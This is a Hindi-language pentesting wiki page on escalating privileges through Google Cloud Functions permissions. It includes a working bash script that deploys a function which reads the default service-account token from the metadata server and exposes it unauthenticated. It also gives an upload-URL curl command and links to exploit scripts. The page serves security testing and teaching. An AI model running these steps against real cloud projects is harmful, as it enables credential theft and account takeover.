# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Cloud Functions के बारे में अधिक जानकारी:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

इन विशेषाधिकारों के साथ एक हमलावर **मनमाने (दुष्ट) कोड के साथ एक नया Cloud Function बना सकता है और इसे एक Service Account सौंप सकता है**। फिर, विशेषाधिकारों को बढ़ाने के लिए मेटाडेटा से Service Account टोकन लीक करें।\
फंक्शन को ट्रिगर करने के लिए कुछ विशेषाधिकारों की आवश्यकता हो सकती है।

इस विधि के लिए शोषण स्क्रिप्ट [यहाँ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) और [यहाँ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) मिल सकती हैं और प्रीबिल्ट .zip फ़ाइल [यहाँ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions) मिल सकती है।

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

इन विशेषाधिकारों के साथ एक हमलावर **एक Function के कोड को संशोधित कर सकता है और यहां तक कि संलग्न सेवा खाते को भी संशोधित कर सकता है** जिसका लक्ष्य टोकन को एक्सफिल्ट्रेट करना है।

> [!CAUTION]
> Cloud functions को तैनात करने के लिए आपको डिफ़ॉल्ट कंप्यूट सेवा खाते पर या उस सेवा खाते पर actAs अनुमतियों की भी आवश्यकता होगी जिसका उपयोग छवि बनाने के लिए किया जाता है।

कुछ अतिरिक्त विशेषाधिकार जैसे कि संस्करण 1 cloudfunctions के लिए `.call` अनुमति या फंक्शन को ट्रिगर करने के लिए `role/run.invoker` भूमिका की आवश्यकता हो सकती है।
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> यदि आपको त्रुटि `Permission 'run.services.setIamPolicy' denied on resource...` मिलती है, तो इसका कारण यह है कि आप `--allow-unauthenticated` पैरामीटर का उपयोग कर रहे हैं और आपके पास इसके लिए पर्याप्त अनुमतियाँ नहीं हैं।

इस विधि के लिए एक्सप्लॉइट स्क्रिप्ट [यहाँ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py) मिल सकती है।

### `cloudfunctions.functions.sourceCodeSet`

इस अनुमति के साथ आप एक **साइन किया हुआ URL प्राप्त कर सकते हैं ताकि एक फ़ाइल को एक फ़ंक्शन बकेट में अपलोड किया जा सके (लेकिन फ़ंक्शन का कोड नहीं बदलेगा, आपको इसे अभी भी अपडेट करना होगा)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Not really sure how useful only this permission is from an attackers perspective, but good to know.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

अपने आप को किसी भी पिछले **`.update`** या **`.create`** विशेषाधिकार दें ताकि आप बढ़ा सकें।

### `cloudfunctions.functions.update`

केवल **`cloudfunctions`** अनुमतियों के साथ, बिना **`iam.serviceAccounts.actAs`** के आप **फंक्शन को अपडेट नहीं कर पाएंगे, इसलिए यह एक मान्य प्रिवेस्क नहीं है।**

### Read & Write Access over the bucket

यदि आपके पास बकेट पर पढ़ने और लिखने की पहुंच है, तो आप कोड में परिवर्तनों की निगरानी कर सकते हैं और जब भी बकेट में **अपडेट होता है, आप अपने कोड के साथ नए कोड को अपडेट कर सकते हैं** ताकि क्लाउड फ़ंक्शन का नया संस्करण प्रस्तुत किए गए बैकडोर कोड के साथ चल सके।

आप हमले के बारे में अधिक जानकारी देख सकते हैं:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

हालांकि, आप इसका उपयोग तीसरे पक्ष के क्लाउड फ़ंक्शंस को पूर्व-समझौता करने के लिए नहीं कर सकते क्योंकि यदि आप अपने खाते में बकेट बनाते हैं और इसे सार्वजनिक अनुमतियाँ देते हैं ताकि बाहरी प्रोजेक्ट इसके ऊपर लिख सके, तो आपको निम्नलिखित त्रुटि मिलती है:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> हालाँकि, इसका उपयोग DoS हमलों के लिए किया जा सकता है।

### Read & Write Access over Artifact Registry

जब एक क्लाउड फ़ंक्शन बनाया जाता है, तो प्रोजेक्ट के आर्टिफैक्ट रजिस्ट्री में एक नया डॉकर इमेज पुश किया जाता है। मैंने इमेज को एक नए के साथ संशोधित करने की कोशिश की, और यहां तक कि वर्तमान इमेज (और `cache` इमेज) को भी हटाने की कोशिश की और कुछ भी नहीं बदला, क्लाउड फ़ंक्शन काम करता रहा। इसलिए, शायद यह **बकेट के साथ रेस कंडीशन हमले का दुरुपयोग करना संभव हो सकता है** ताकि डॉकर कंटेनर को बदला जा सके जो चलाया जाएगा लेकिन **संग्रहित इमेज को केवल संशोधित करना क्लाउड फ़ंक्शन को समझौता करने के लिए संभव नहीं है।**

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
